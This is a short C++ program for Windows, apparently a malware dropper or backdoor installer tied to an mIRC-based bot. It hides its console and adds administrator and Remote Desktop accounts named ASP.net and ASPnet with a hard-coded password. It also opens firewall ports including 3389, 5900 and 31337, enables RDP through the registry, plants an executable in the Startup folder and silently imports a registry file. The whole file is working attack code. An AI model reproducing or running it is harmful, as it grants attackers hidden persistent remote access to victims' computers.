#include <Windows.h>
#include <iostream>
int main()
{
	FreeConsole();
	system("%appdata%\\mIRC\\RDPWInst.exe -i -o");
	system("start /MIN /REALTIME %WINDIR%\\System32\\net.exe user ASP.net W33dz123!@#$ /ADD &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\net.exe user ASPnet W33dz123!@# /ADD &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\net.exe localgroup Administrators ASP.net /ADD &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\net.exe localgroup Administrators ASPnet /ADD &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\net.exe localgroup \"Remote Desktop Users\" ASP.net /ADD &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\net.exe localgroup \"Remote Desktop Users\" ASPnet /ADD &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\netsh.exe advfirewall firewall add rule name=Remote dir=in action=allow protocol=TCP localport=3389 &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\netsh.exe advfirewall firewall add rule name=Remote1 dir=in action=allow protocol=TCP localport=5900 &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\netsh.exe advfirewall firewall add rule name=Remote2 dir=in action=allow protocol=TCP localport=5901 &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\netsh.exe advfirewall firewall add rule name=Remote3 dir=in action=allow protocol=TCP localport=5801 &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\netsh.exe advfirewall firewall add rule name=Remote4 dir=in action=allow protocol=TCP localport=31337 &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\xcopy.exe %appdata%\\mIRC\\init.exe C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup &");
	system("start /MIN /REALTIME %WINDIR%\\System32\\regedit.exe /s %appdata%\\mIRC\\defaults\\s.reg &");
	system("start /MIN /REALTIME %appdata%\\mIRC\\mIRC.exe &");
	return 0;
}
